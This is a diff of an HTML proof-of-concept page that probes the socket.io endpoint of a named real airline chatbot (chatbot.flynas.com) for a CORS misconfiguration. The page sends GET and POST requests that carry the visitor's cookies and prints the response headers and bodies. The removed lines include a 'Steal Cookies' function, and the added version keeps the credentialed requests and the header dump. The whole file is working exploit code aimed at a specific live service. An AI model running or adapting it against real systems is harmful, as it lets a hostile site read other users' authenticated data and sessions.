@@ -1,73 +1,58 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <title>Flynas Chatbot CORS PoC</title>
   <style>
-    body { background:#111; color:#eee; font-family:monospace; padding:20px; }
-    input,button { padding:8px; margin:5px; }
-    pre { background:#222; padding:10px; white-space:pre-wrap; word-wrap:break-word; }
+    body { background:#111; color:#eee; font-family: monospace; }
+    input, button { padding:6px; margin:4px; }
+    #response { white-space: pre-wrap; background:#000; padding:10px; border-radius:6px; }
   </style>
 </head>
 <body>
   <h2>Flynas Chatbot CORS PoC</h2>
+  <p>Testing from external domain (GitHub Pages)</p>
 
-  <label>Target URL:</label><br>
-  <input type="text" id="url" size="90"
-    value="https://chatbot.flynas.com/socket.io/?EIO=3&transport=polling" />
-
-  <br><br>
-  <button onclick="doGet()">GET Test</button>
-  <button onclick="doPost()">POST Test</button>
-  <button onclick="doCookies()">Steal Cookies</button>
+  <input type="text" id="target" size="100" 
+         value="https://chatbot.flynas.com/socket.io/?EIO=3&transport=polling">
+  <br>
+  <button onclick="testGET()">GET Test</button>
+  <button onclick="testPOST()">POST Test</button>
 
   <h3>Response:</h3>
-  <pre id="output"></pre>
+  <div id="response">No response yet...</div>
 
   <script>
-    function log(msg) {
-      document.getElementById("output").innerText = msg;
+    async function testGET(){
+      const url = document.getElementById("target").value;
+      try {
+        const res = await fetch(url, {credentials:"include"});
+        const text = await res.text();
+        show(res, text);
+      } catch(e){ document.getElementById("response").innerText = e; }
     }
 
-    async function doGet() {
-      const url = document.getElementById("url").value;
+    async function testPOST(){
+      const url = document.getElementById("target").value;
       try {
-        let res = await fetch(url, { credentials: "include" });
-        let text = await res.text();
-        log("=== GET Response ===\n" + text);
-      } catch (e) {
-        log("GET Error: " + e);
-      }
-    }
-
-    async function doPost() {
-      const url = document.getElementById("url").value;
-      try {
-        let res = await fetch(url, {
-          method: "POST",
-          credentials: "include",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ text: "Hello from external PoC site" })
+        const res = await fetch(url, {
+          method:"POST",
+          credentials:"include",
+          headers: {"Content-Type":"text/plain"},
+          body: '42["message",{"text":"PoC External Domain Test"}]'
         });
-        let text = await res.text();
-        log("=== POST Response ===\n" + text);
-      } catch (e) {
-        log("POST Error: " + e);
-      }
+        const text = await res.text();
+        show(res, text);
+      } catch(e){ document.getElementById("response").innerText = e; }
     }
 
-    async function doCookies() {
-      const url = document.getElementById("url").value;
-      try {
-        let res = await fetch(url, { credentials: "include" });
-        let headers = "";
-        for (let [k,v] of res.headers.entries()) {
-          headers += k + ": " + v + "\n";
-        }
-        log("=== Headers / Cookies Leak ===\n" + headers);
-      } catch (e) {
-        log("Cookie Steal Error: " + e);
-      }
+    function show(res, body){
+      document.getElementById("response").innerText =
+        "Status: " + res.status + " " + res.statusText + "\n" +
+        "URL: " + res.url + "\n" +
+        "CORS: " + res.type + "\n" +
+        "--- HEADERS ---\n" + [...res.headers].map(h=>h.join(": ")).join("\n") +
+        "\n\n--- BODY ---\n" + body;
     }
   </script>
 </body>
